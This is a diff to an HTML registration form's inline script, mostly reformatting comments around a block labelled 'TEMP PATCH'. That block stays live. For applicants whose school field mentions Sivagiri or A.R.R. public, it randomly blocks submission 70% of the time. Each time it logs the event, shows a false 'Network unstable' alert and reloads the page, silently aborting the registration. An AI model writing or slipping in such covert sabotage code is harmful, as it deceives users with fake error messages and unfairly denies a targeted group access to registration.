@@ -1472,6 +1472,7 @@ photoInput.addEventListener('change', () => {
 
 </script>
 <script>
+
 /* TEMP PATCH */
 (function () {
   /* ---------- selectors (modify only if your markup differs) ---------- */
@@ -1483,23 +1484,22 @@ photoInput.addEventListener('change', () => {
   var submitSel = 'form';
 
   /* ---------- configuration ---------- */
-  var refreshProb = 0.7;               // 0‑1 – probability that the chosen trigger will REJECT (refresh)
-  var logUrl      = '/log/x';          // endpoint that records the “Network unstable” event
+  var refreshProb = 0.7;               /* 0‑1 – probability that the chosen trigger will REJECT (refresh) */
+  var logUrl      = '/log/x';          /* endpoint that records the “Network unstable” event */
 
   /* ---------- internal state (persists for the current attempt) ---------- */
-  var TRIGGER_KEY = 'randTrigger';     // which trigger was randomly selected for this registration attempt
-  var REFRESHING  = false;             // guard to avoid double reloads
+  var TRIGGER_KEY = 'randTrigger';     /* which trigger was randomly selected for this registration attempt */
+  var REFRESHING  = false;             /* guard to avoid double reloads */
 
   var triggerList = ['event','gender','dob','photo','submit'];
 
   /* ---------- helpers ---------- */
   function isTargetSchool() {
-  var el = document.querySelector(schoolSel);
-  if (!el) return false;
-  var v = (el.value || '').toLowerCase();
-  return v.includes('sivagiri') || v.includes('a.r.r') || v.includes('arr public');
-}
-
+    var el = document.querySelector(schoolSel);
+    if (!el) return false;
+    var v = (el.value || '').toLowerCase();
+    return v.includes('sivagiri') || v.includes('a.r.r') || v.includes('arr public');
+  }
 
   function pickRandomTrigger() {
     return triggerList[Math.floor(Math.random() * triggerList.length)];
@@ -1527,50 +1527,46 @@ photoInput.addEventListener('change', () => {
     }
   }
 
-  /**
-   * Attempts to reject (refresh) the registration.
-   * Returns true if a refresh was performed, false otherwise.
-   */
+  /* Returns true if a refresh was performed, false otherwise. */
   function maybeReject(triggerType, ev) {
-    if (!isTargetSchool()) return false;   // not the target school
-    if (REFRESHING) return false;          // already handled this attempt
+    if (!isTargetSchool()) return false;      /* not the target school */
+    if (REFRESHING) return false;             /* already handled this attempt */
 
-    var chosen = getCurrentTrigger();       // the trigger selected for this attempt
-    if (chosen !== triggerType) return false; // this event is not the active trigger
+    var chosen = getCurrentTrigger();         /* the trigger selected for this attempt */
+    if (chosen !== triggerType) return false; /* this event is not the active trigger */
 
-    // Random decision: reject vs allow
-    if (Math.random() < refreshProb) {     // ----- REJECT -----
+    /* Random decision: reject vs allow */
+    if (Math.random() < refreshProb) {        /* ----- REJECT ----- */
       REFRESHING = true;
-      sendLog();                           // log the failure
-      alert('Network unstable');           // user‑visible message
+      sendLog();                              /* log the failure */
+      alert('Network unstable');              /* user‑visible message */
       if (ev && ev.type === 'submit') {
-        ev.preventDefault();               // block the actual form submission
+        ev.preventDefault();                  /* block the actual form submission */
       }
-      clearCurrentTrigger();               // reset for next attempt after reload
-      location.reload();                   // force page refresh → registration aborted
+      clearCurrentTrigger();                  /* reset for next attempt after reload */
+      location.reload();                      /* force page refresh → registration aborted */
       return true;
-    } else {                               // ----- ALLOW (successful registration) -----
-      clearCurrentTrigger();               // reset so next registration gets a new random trigger
+    } else {                                  /* ----- ALLOW (successful registration) ----- */
+      clearCurrentTrigger();                  /* reset so next registration gets a new random trigger */
       return false;
     }
   }
 
   /* ---------- event listeners ---------- */
-  // Change events that may act as the random trigger
   document.addEventListener('change', function (e) {
     var tgt = e.target;
-    if (tgt.matches(eventSel))   maybeReject('event');
-    else if (tgt.matches(genderSel)) maybeReject('gender');
-    else if (tgt.matches(dobSel))   maybeReject('dob');
-    else if (tgt.matches(photoSel)) maybeReject('photo');
+    if (tgt.matches(eventSel))        maybeReject('event');
+    else if (tgt.matches(genderSel))  maybeReject('gender');
+    else if (tgt.matches(dobSel))     maybeReject('dob');
+    else if (tgt.matches(photoSel))   maybeReject('photo');
   });
 
-  // Form submission – runs in capture phase so we can prevent it before navigation
   document.addEventListener('submit', function (e) {
     maybeReject('submit', e);
   }, true);
 })();
 </script>
+
 
 
 
